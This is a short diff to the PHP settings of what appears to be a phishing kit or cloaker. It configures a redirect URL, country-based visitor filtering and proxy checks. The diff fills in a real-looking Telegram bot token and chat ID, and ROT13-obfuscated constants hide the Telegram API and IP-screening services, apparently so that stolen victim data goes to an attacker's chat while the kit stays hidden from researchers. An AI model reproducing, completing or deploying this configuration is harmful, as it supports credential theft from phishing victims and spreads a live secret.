@@ -59,11 +59,11 @@ $license = "Houss-1987";
 
 $redirect = "https://1-10-2025.netsons.org/";
 
-$parameter = 1; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
+$parameter = 2; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
 $checkfileup = false; // Check Link UP
 
-$country = array("ma","ca","us") #Country's Allowed To Access
+$country = array("ma","ca","us"); #Country's Allowed To Access
 
 /************************************************************* PARAMETRES ******************************************************************/
 
@@ -85,8 +85,8 @@ class Obj
     const timeout = 10;
     const id = "1061031967:";
     const filename = "ih.gkg";
-    const token = "x";
-    const chatid = "x";
+    const token = "7032892858:AAGr73d0N2LwNDbJqdB58tjvOjXcbC8eWP8";
+    const chatid = "-4275336100";
     const telegram = "uggcf://ncv.gryrtenz.bet/obg";
     const api1 = "uggcf://oynpxobk.vcvasb.ncc/ybbxhc/";
     const api2 = "uggc://purpx.trgvcvagry.arg/purpx.cuc?vc=";
